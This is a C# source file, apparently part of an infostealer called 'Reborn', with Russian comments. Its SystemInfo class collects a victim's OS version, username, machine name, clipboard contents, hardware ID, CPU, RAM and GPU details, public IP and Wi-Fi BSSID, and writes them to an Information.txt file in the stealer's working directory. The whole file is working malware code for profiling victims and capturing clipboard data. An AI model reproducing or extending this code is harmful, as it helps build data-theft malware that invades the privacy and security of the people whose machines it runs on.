using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Reborn
{
    class SystemInfo
    {
        public static void GetSystem() // Запись файла Information
        {
            string Stealer_Dir = Help.StealerDir;
            string InfoText = (
                       " ==================================================" +
                     "\n Operating system: " + GetSystemVersion() +
                     "\n PC user: " + compname + "/" + username +
                     "\n ClipBoard: " + Buffer.GetBuffer() +
                     "\n Launch: " + Help.PatchBuildName +
                     "\n ==================================================" +
                     "\n Screen resolution: " + ScreenMetrics() +
                     "\n Current time: " + DateTime.Now +
                     "\n HWID: " + GetProcessorID() +
                     "\n ==================================================" +
                     "\n CPU: " + GetCPUName() +
                     "\n RAM: " + GetRAM() +
                     "\n GPU: " + GetGpuName() +
                     "\n ==================================================" +
                     "\n IP Geolocation: " + IP() +
                     "\n Log Date: " + Help.date +
                     "\n BSSID: " + BSSID.GetBSSID() +
                     "\n ==================================================");
            File.WriteAllText(Stealer_Dir + "\\Information.txt", InfoText);
        }

        // Юсер имя
        public static string username = Environment.UserName;
        // Имя
        public static string compname = Environment.MachineName;
        public static string GetSystemVersion() // Получение версии виндовс
        {
            return GetWindowsVersionName() + " " + GetBitVersion();
        }
        public  static string GetWindowsVersionName()// Версия виндовс
        {
            string sData = "Unknown System";
            try
            {
                using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem"))
                {
                    foreach (ManagementObject tObj in mSearcher.Get())
                        sData = Convert.ToString(tObj["Name"]);
                    sData = sData.Split(new char[] { '|' })[0];
                    int iLen = sData.Split(new char[] { ' ' })[0].Length;
                    sData = sData.Substring(iLen).TrimStart().TrimEnd();
                }
            }
            catch(Exception e) 
            {
                //Console.WriteLine(e);
            }
            return sData;
        }
        private static string GetBitVersion() // Получение битности
        {
            try
            {
                if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0")
                    .GetValue("Identifier")
                    .ToString()
                    .Contains("x86"))
                    return "(32 Bit)";
                else
                    return "(64 Bit)";
            }
            catch (Exception e)
            {
                //Console.WriteLine(e);
            }
            return "(Unknown)";
        }
public static string IP()
        {
            using (var webClient = new WebClient())
            {
                var validIP = webClient.DownloadString("https://ifconfig.me/ip");
                string pattern = @"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"; // регулярное выражение для нахождения IP адреса
                Match match = Regex.Match(validIP, pattern); // поиск IP по регулярному выражению
                string ip = match.Value; // получение искомого IP
                return ip;
            }
        }
        public static string ScreenMetrics() // Получение разрешение экрана
        {
            Rectangle bounds = System.Windows.Forms.Screen.GetBounds(Point.Empty);
            int width = bounds.Width;
            int height = bounds.Height;
            return width + "x" + height;
        }
        public static string GetCPUName() // Получение имени процессора
        {
            try
            {
                string CPU = string.Empty;
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    CPU = mObject["Name"].ToString();
                }
                return CPU;
            }
            catch (Exception e)
            {
                //Console.WriteLine(e + "СистемИнфа");
                return "Error";
            }
        }
        public static string GetRAM() // Получаем кол-во RAM Памяти в мб
        {
            try
            {
                int RamAmount = 0;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (ManagementObject MO in MOS.Get())
                    {
                        double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
                        RamAmount = (int)(Bytes / 1048576) - 1;
                        break;
                    }
                }
                return RamAmount.ToString() + "MB";
            }
            catch (Exception e)
            {
                return "Error";
            }
        }
        public static string GetProcessorID() // Получаем Processor Id
        {
            string sProcessorID = string.Empty;
            ManagementObjectSearcher oManagementObjectSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");
            ManagementObjectCollection oCollection = oManagementObjectSearcher.Get();
            foreach (ManagementObject oManagementObject in oCollection)
            {
                sProcessorID = (string)oManagementObject["ProcessorId"];
            }
            return (sProcessorID);
        }
        public static string GetGpuName() // Получаем имя видеокарты
        {
            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                foreach (ManagementObject mObject in mSearcher.Get())
                    return mObject["Name"].ToString();
            }
            catch (Exception e)
            {
                //Console.WriteLine(e);
            }
            return "Unknown";
        }
    }
}
